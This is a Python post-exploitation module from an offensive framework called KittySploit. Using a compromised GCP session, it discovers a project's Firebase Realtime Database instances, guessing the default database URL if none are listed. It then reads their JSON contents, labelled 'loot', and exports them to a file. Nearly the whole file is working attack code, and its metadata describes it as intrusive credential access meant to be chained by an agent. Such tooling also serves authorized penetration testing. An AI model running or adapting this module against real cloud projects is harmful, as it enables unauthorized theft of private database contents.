#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json

from kittysploit import *
from lib.post.gcp import GcpPostMixin


class Module(Post, GcpPostMixin):
    __info__ = {
        "name": "GCP Firebase Realtime Database Loot",
        "description": "Discover Firebase RTDB instances and read database JSON via authenticated REST access",
        "author": "KittySploit Team",
        "session_type": SessionType.GCP_API,
        "tags": ["gcp", "firebase", "rtdb", "database", "loot"],
    'agent': {
        'risk': 'intrusive',
        'effects': ['credential_access', 'api_request'],
        'expected_requests': 5,
        'reversible': False,
        'approval_required': True,
        'produces': ['credentials', 'risk_signals'],
        'cost': 1.5,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': ['shell'],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    database_url = OptString("", "Specific RTDB root URL; empty discovers project instances", False)
    path = OptString("", "Optional sub-path under the database root", False)
    shallow = OptBool(True, "Use shallow=true to list top-level keys only", False)
    max_instances = OptInteger(10, "Maximum RTDB instances to process", False)
    mask_values = OptBool(True, "Mask JSON payloads in console output", False)
    export_json = OptString("", "Optional output JSON file", False)

    def run(self):
        try:
            project_id = self._gcp_project_id()
            if not project_id:
                print_error("Could not resolve project_id from session")
                return False

            instances = self._resolve_instances()
            if not instances:
                print_warning("No Firebase Realtime Database instances found")
                return self.module_result(success=True, data={"instances": []})

            max_instances = max(1, int(self.max_instances or 10))
            loot = []

            print_info(f"Looting {min(len(instances), max_instances)} RTDB instance(s)...")
            for instance in instances[:max_instances]:
                database_url = str(instance.get("databaseUrl") or instance.get("database_url") or "").strip()
                name = str(instance.get("name") or database_url).rsplit("/", 1)[-1]
                if not database_url:
                    continue

                print_info(f"RTDB: {name}")
                print_info(f"  url: {database_url}")
                fetched = self._gcp_rtdb_fetch_json(
                    database_url,
                    path=str(self.path or ""),
                    shallow=bool(self.shallow),
                )
                entry = {
                    "name": name,
                    "databaseUrl": database_url,
                    "instance": instance,
                    "request_url": fetched.get("url"),
                    "data": fetched.get("data") if fetched.get("ok") else None,
                    "error": fetched.get("error"),
                }
                if fetched.get("ok"):
                    rendered = json.dumps(fetched.get("data"), ensure_ascii=False)[:2000]
                    print_success("  authenticated read succeeded")
                    print_info(f"  payload: {self._gcp_mask_value(rendered, mask=self.mask_values)}")
                else:
                    print_warning(f"  read failed: {str(fetched.get('error') or '')[:300]}")
                loot.append(entry)
                print_info("-" * 80)

            payload = {"project_id": project_id, "instances": loot}
            exported = self._gcp_export_json(self.export_json, payload) if self.export_json else ""
            if exported:
                print_success(f"Loot exported to {exported}")
            print_success(f"Processed {len(loot)} RTDB instance(s)")
            return self.module_result(success=True, data=payload)
        except Exception as exc:
            print_error(f"Firebase RTDB loot failed: {exc}")
            return False

    def _resolve_instances(self):
        configured = str(self.database_url or "").strip().rstrip("/")
        if configured:
            return [{"databaseUrl": configured, "name": configured}]

        project_id = self._gcp_project_id()
        instances = self._gcp_list_firebase_rtdb_instances(project_id)
        if instances:
            return instances

        fallback = f"https://{project_id}-default-rtdb.firebaseio.com"
        return [{"databaseUrl": fallback, "name": f"{project_id}-default-rtdb", "fallback": True}]
